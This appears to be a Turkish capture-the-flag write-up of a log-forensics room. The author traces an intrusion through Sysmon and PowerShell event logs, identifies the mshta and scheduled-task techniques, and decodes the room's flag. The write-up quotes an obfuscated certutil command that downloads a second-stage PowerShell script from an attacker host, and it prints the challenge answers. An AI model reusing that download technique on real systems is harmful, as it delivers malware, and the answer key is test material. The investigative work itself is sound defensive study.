# Handbook for the Recently Compromised THNN

> Karmaşık bir exploit, reverse shell veya ayrıcalık yükseltme yok. Sadece Windows olay günlükleri, şüpheli komutlar ve izlerini gizlemeye çalışan bir saldırgan.

---

## İlk Bakış

İlk olarak verilen dosyaları kontrol ettim:

```bash
cd ~/Desktop/artifacts/tools
ls -lah
```

İki önemli Windows olay günlüğü buldum:

- `Microsoft-Windows-Sysmon%4Operational.evtx`
- `PowerShell-Operational.evtx`

Ayrıca Windows olay günlüklerini okuyabilmek için `evtx_dump` aracını buldum.

Bu oda klasik bir exploit odasından farklı. Amacımız günlükleri inceleyerek saldırının nasıl gerçekleştiğini ortaya çıkarmak.

---

## Gizlenen Windows Aracı

İlk olarak Sysmon günlüklerinde wildcard karakterleri içeren komutları aradım:

```bash
./evtx_dump ../Microsoft-Windows-Sysmon%4Operational.evtx | grep -i "CommandLine" | grep "*"
```

Şüpheli bir PowerShell komutuyla karşılaştım:

```powershell
& ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1
```

Saldırgan, çalıştırılabilir dosyanın tam adını yazmak yerine `certu*.exe` şeklinde wildcard kullanmıştı.

Bu ifade şu Windows aracına karşılık geliyordu:

```text
certutil.exe
```

`certutil.exe` normalde sertifika işlemleri için kullanılan meşru bir Windows aracıdır. Ancak saldırganlar dosya indirmek için de kötüye kullanabilir.

**Cevap 1:** `certutil.exe`

---

## İkinci Aşama Payload

Aynı komut içerisinde indirilen dosyanın URL adresini buldum:

```text
http://pipeline-cdn.thm:8088/pipeline-sync.ps1
```

Saldırgan, `certutil.exe` aracını kullanarak ikinci aşama PowerShell dosyasını indirmişti.

Dosya kullanıcının geçici dizinine kaydediliyordu.

**Cevap 2:**

```text
http://pipeline-cdn.thm:8088/pipeline-sync.ps1
```

---

## İlk Çalıştırma — MSHTA

Daha sonra Sysmon günlüklerinde `mshta.exe` işlemini aradım:

```bash
./evtx_dump ../Microsoft-Windows-Sysmon%4Operational.evtx | grep -i -C 5 "mshta.exe"
```

Şüpheli bir HTA dosyasının çalıştırıldığını gördüm:

```text
C:\Windows\SysWOW64\mshta.exe
C:\Users\j.collins\Downloads\pipeline-check.hta
```

Saldırgan, HTA dosyasını çalıştırmak için Windows'un yerleşik `mshta.exe` aracını kullanmıştı.

Bu teknik MITRE ATT&CK içerisinde Signed Binary Proxy Execution: Mshta olarak geçiyor.

Teknik kodu:

```text
T1218.005
```

**Cevap 3:** `T1218.005`

---

## Kalıcılık Mekanizması

Saldırganın sistemde kalıcılık sağlamak için kullandığı yöntemi araştırdım:

```bash
./evtx_dump ../Microsoft-Windows-Sysmon%4Operational.evtx | grep -i -E -C 5 "schtasks|StudioPipelineSync"
```

Şüpheli bir zamanlanmış görev buldum:

```text
StudioPipelineSync
```

Saldırgan, Windows Görev Zamanlayıcısı'nı kullanarak sistemde kalıcılık sağlamıştı.

Görev, kullanıcının oturum açmasıyla çalışacak şekilde yapılandırılmıştı.

MITRE ATT&CK teknik kodu:

```text
T1053.005
```

**Cevap 4:** `T1053.005`

---

## Flag'i Bulma

Son olarak PowerShell Operational günlüklerini inceledim:

```bash
./evtx_dump ../PowerShell-Operational.evtx | grep -i -A 10 "ScriptBlockText"
```

Günlüklerde şüpheli PowerShell kodları ve Base64 ile kodlanmış bir veri buldum.

Base64 verisini çözmek için:

```bash
echo -n 'VEhNe3RIM19HaDBzdF93MXRIX1RoM19NMDVUfQ==' | base64 -d
```

Sonuç:

```text
THM{tH3_Gh0st_w1tH_Th3_M05T}
```

Flag'i elde ettim.

---

## Öğrendiklerim

- EVTX dosyaları Windows sistemlerinde önemli adli bilişim kanıtları barındırır.
- `certutil.exe` dosya indirmek için kötüye kullanılabilir.
- `mshta.exe` zararlı HTA dosyalarını çalıştırmak için kullanılabilir.
- Zamanlanmış görevler yaygın bir kalıcılık yöntemidir.
- PowerShell günlükleri şüpheli komutları ve kodlanmış payload'ları ortaya çıkarabilir.
- Farklı olay günlüklerini birlikte incelemek saldırı zincirini anlamayı kolaylaştırır.

---

> Yazar: LatenT | Tarih: Ekim 2026
